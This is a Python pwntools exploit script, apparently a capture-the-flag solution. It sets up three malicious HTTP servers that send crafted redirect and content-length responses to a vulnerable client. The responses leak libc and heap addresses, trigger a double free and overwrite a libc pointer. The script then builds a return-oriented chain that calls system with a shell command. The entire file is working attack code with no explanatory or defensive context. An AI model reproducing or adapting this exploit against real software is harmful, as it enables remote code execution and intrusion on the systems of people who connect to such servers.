from pwn import *

#context.log_level = "DEBUG"


def move(p) : 
    pay = "content-length: 1200\r\nlocation: http://howdays.kr:20418\r\n\x00\r\n"

    p.send(pay)

leakcnt = 0
exploitcnt = 0

def leak(p) : 
    global leakcnt
    global libc
    global heap

    if leakcnt == 0 :
        pay = '''location: /\r\n\x00\r\n'''
        p.send(pay)
    
    if leakcnt == 1 : 
        libc = u64("\x00" + p.recv().split("/")[1][:5] + "\x00\x00") - 0x3ebc00
        print hex(libc)
        pay = "location: /%s\r\n"%("A"*0x90)
        pay += "content-length: 1440\r\nlocation: /%s\r\n"%("B"*0x90)
        pay += "content-length: 4060\r\n"
        pay += "location: /%s\r\n"%("A"*0x30)
        pay += "content-length: 10\r\n"
        pay += "location: /%s\r\n"%("C"*0x10)
        pay += "\x00\r\n"
       
        p.send(pay)
    
    if leakcnt == 2 : 
        p.recvuntil("C"*0x10)
        heap = u64("\x00" + p.recv(5) + "\x00\x00")
        print hex(heap)
        pay = '''location: http://howdays.kr:20419\r\nlocation: http://howdays.kr:20419\r\n\x00\r\n'''
        p.send(pay)


    leakcnt += 1


def exploit(p) :
    global exploitcnt
    global libc
    global heap

    prdi = libc + 0x000000000002155f
    prdxrsi = libc + 0x00000000001306d9

    print "A"
    command = "/bin/ls;"

    if exploitcnt == 0 :  #double free
        pay =  "content-length: 16\r\n"
        pay +=  "location: /%s\r\n"%("A"*0x50)
        pay +=  "location: /%s\r\n"%("A"*0x50)
        pay += "\x00\r\n" 
        p.send(pay)
    
    if exploitcnt == 1 : 
        
        pay =  "location: /%s\r\n"%(p64(libc+0x3ebc30)[1:])
        pay += "location: /%s\r\n"%("B"*3)
        pay += "location: /%s\r\n"%(p64(libc+0x520a5)[:6])
        p.send(pay)

        ex = p64(prdi) + p64(heap - 0xc8) + p64(libc + 0x4f440) + command

        pay =  "content-length: %d"%(heap - 0xd0-1)
        pay += "\x00"*0x12
        pay += ex.ljust(0xb0,"B")
        pay += p64(heap - 0xe0 - 8) + p64(prdi)
        pay += "\r\n"
        #pay += "\x00\r\n" 
        #pay += "location: /%s\r\n"%("C"*0x50)

        p.send(pay)

#0x7ffff7a360a5    
    exploitcnt += 1


s = server(3000,callback=move)
s1 = server(4000,callback=leak)
s2 = server(5000,callback=exploit)

raw_input()
